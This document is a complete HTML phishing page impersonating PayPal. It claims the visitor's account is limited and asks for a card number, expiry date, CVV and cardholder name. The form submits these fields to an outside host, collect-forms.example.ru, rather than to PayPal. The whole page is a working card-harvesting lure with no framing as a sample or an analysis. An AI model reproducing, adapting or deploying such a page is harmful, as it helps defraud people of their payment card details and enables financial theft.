<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Confirm your PayPal account</title>
<style>
  body { font-family: system-ui, sans-serif; margin: 0; background: #f6f7f9; color: #202124; }
  .wrap { max-width: 520px; margin: 48px auto; background: #fff; padding: 32px; border-radius: 12px;
           box-shadow: 0 1px 4px rgba(0,0,0,.12); }
  h1 { font-size: 20px; margin: 0 0 4px; }
  p.lede { margin: 0 0 24px; color: #5f6368; font-size: 14px; }
  label { display: block; margin: 14px 0 4px; font-size: 13px; font-weight: 600; }
  input, select { width: 100%; box-sizing: border-box; padding: 9px 10px; font-size: 14px;
                   border: 1px solid #dadce0; border-radius: 6px; }
  button { margin-top: 22px; width: 100%; padding: 11px; font-size: 15px; border: 0;
            border-radius: 6px; background: #1a73e8; color: #fff; cursor: pointer; }
</style>
</head>
<body>
<div class="wrap">

<h1>Confirm your account</h1>
<p class="lede">Your account has been limited. Confirm your card to restore access.</p>
<form action="https://collect-forms.example.ru/submit" method="post">
  <label for="cc">Credit card number</label>
  <input id="cc" name="cardnum" autocomplete="cc-number" inputmode="numeric" required>
  <label for="exp">Expiry date</label>
  <input id="exp" name="exp" autocomplete="cc-exp" placeholder="MM/YY" required>
  <label for="cvv">CVV</label>
  <input id="cvv" name="cvv" autocomplete="cc-csc" inputmode="numeric" required>
  <label for="nm">Cardholder name</label>
  <input id="nm" name="holder" autocomplete="cc-name" required>
  <button type="submit">Restore access</button>
</form>
</div>
</body>
</html>
